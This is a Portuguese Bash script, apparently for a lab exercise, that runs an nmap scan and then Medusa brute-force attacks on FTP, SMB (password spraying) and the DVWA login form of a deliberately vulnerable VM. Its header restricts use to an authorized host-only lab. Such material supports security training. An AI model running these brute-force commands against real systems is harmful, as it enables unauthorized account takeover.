#!/bin/bash
# =============================================================================
# run_lab.sh
# Script de apoio para o desafio "Ataques de Força Bruta com Medusa"
#
# USO EXCLUSIVO EM LABORATÓRIO CONTROLADO (rede host-only, VMs vulneráveis
# de propósito: Metasploitable 2 / DVWA). NÃO execute contra sistemas que
# não sejam seus ou sem autorização explícita.
#
# Edite as variáveis abaixo antes de rodar.
# =============================================================================

set -e

# --- CONFIGURAÇÃO ------------------------------------------------------------
ALVO="192.168.56.102"              # IP da VM vulnerável (Metasploitable2/DVWA)
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"
SAIDA="../images/../resultados"    # pasta para logs
DVWA_COOKIE="PHPSESSID=SEU_COOKIE_AQUI; security=low"

mkdir -p "$SAIDA"

echo "============================================================"
echo "[1/4] Reconhecimento inicial com Nmap"
echo "============================================================"
nmap -sV -p 21,22,139,445,80 "$ALVO" | tee "$SAIDA/nmap_scan.txt"

echo ""
echo "============================================================"
echo "[2/4] Força bruta em FTP (porta 21) com Medusa"
echo "============================================================"
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M ftp \
  | tee "$SAIDA/medusa_ftp.txt"

echo ""
echo "============================================================"
echo "[3/4] Password spraying / enumeração em SMB (porta 445)"
echo "============================================================"
# Enumeração de usuários via Metasploit/enum4linux é feita manualmente
# (ver README.md, seção SMB). Aqui aplicamos o spraying com Medusa:
medusa -h "$ALVO" -U "$USUARIOS" -p "123456" -M smbnt \
  | tee "$SAIDA/medusa_smb.txt"

echo ""
echo "============================================================"
echo "[4/4] Ataque ao formulário de login do DVWA (módulo web-form)"
echo "============================================================"
# Ajuste os parâmetros do formulário conforme a inspeção feita no navegador
# (Dev Tools > Network) antes de rodar.
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"login.php" \
  -m FORM-DATA:"username=&password=&Login=Login" \
  -c "$DVWA_COOKIE" \
  | tee "$SAIDA/medusa_dvwa.txt"

echo ""
echo "Concluído. Resultados salvos em: $SAIDA"
